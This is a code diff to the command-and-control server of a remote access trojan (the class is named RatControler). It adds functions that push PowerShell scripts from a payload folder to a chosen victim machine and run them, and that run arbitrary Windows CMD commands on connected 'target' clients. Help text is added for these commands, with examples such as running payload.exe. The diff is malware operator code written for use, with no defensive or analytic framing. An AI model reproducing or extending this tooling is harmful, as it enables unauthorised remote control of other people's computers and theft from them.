@@ -29,17 +29,18 @@ class BasicControler:
         except Exception as e:
             self.server.Msg(f"[!!] ERROR: Try Pipe send data [!!] : {e}")
     
-    def sendMsg2Client(self, cliID: str, message: str):
+    def sendMsg2Client(self, cliID: str, message: str) -> None:
         if cliID.lower() == "all":
             for cli in self.server.Central.clients.values():
                 cli.sendMsg(message)
-            return
+            return None
         client = self.server.Central.clients.get(cliID)
         if not client:
             self.server.Msg(f"Client ID:{cliID} is not connected")
-            return
+            return None
         client.sendMsg(message)
-    
+        return True
+
     def saveCliInfo(self, cliID: str) -> None:
         if cliID.lower() == "all":
             if len(self.server.Central.clients) == 0:
@@ -337,6 +338,19 @@ class RatControler(BasicControler):
         msg = self.makeSysMsg(["hunt"] + [cmd[1]])
         self.sendMsg2Client(cmd[0], msg)
     
+    def sendPScript(self, cli_ID: str, fname: str) -> None:
+        data = self.server.loadTextScript(fname)
+        if not data:
+            return
+        psmsg = self.makeSysMsg(["pss", data])
+        if self.sendMsg2Client(cli_ID, psmsg):
+            self.server.Msg(f"Send script to client no.{cli_ID}")
+    
+    def sendCMDcommand(self, cli_ID: str, cmd: str) -> None:
+        msg = self.makeSysMsg(["cmd", cmd])
+        self.sendMsg2Client(cli_ID, msg)
+        
+    
     def execCMD(self, cmd: list) -> None:
         match cmd[0]:
             case "up":
@@ -356,6 +370,14 @@ class RatControler(BasicControler):
                 self.downFile(cmd[1:])
             case "hunt":
                 self.huntFile(cmd[1:])
+            case "pss":
+                if len(cmd) < 3:
+                    return
+                self.sendPScript(cmd[1], cmd[2])
+            case "cmd":
+                if len(cmd) < 3:
+                    return
+                self.sendCMDcommand(cmd[1], cmd[2])
 
 
             case _:
@@ -376,8 +398,12 @@ class RatControler(BasicControler):
         hilfe += "  ss shell <cli_ID> cd <dir_name>                   - Change directory on target clients\n"
         hilfe += "  ex: ss shell 5 cd c:/windows                      - Change directory to windows on client no.5\n"
         hilfe += "  ss shell <cli_ID> pwd                             - Show actual directory on target client\n"
+        hilfe += "  ss cmd <cli_ID> <command>                         - Execute command in windows CMD on target client"
         hilfe += "  ss run <cli_ID> <file_name>                       - Run file (like exe) on target client\n"
         hilfe += "  ex: ss run 1 payload.exe                          - Run payload.exe on client no.1\n"
         hilfe += "  ss ps <cli_ID> <command>                          - Execute command in WindowsPowerShell on target client\n"
+        hilfe += "  ss pss <cli_ID> <file_name>                       - load PowerShell Script from file, send and execute on target client. Recive response\n"
+        hilfe += "                                                    - file must be in PAYLOAD Dir !!\n"
+        hilfe += "  ex: ss pss 3 my_script.ps1                        - Send script from 'my_script.ps1' to client no.3\n"
 
         return self.hilfe() + hilfe
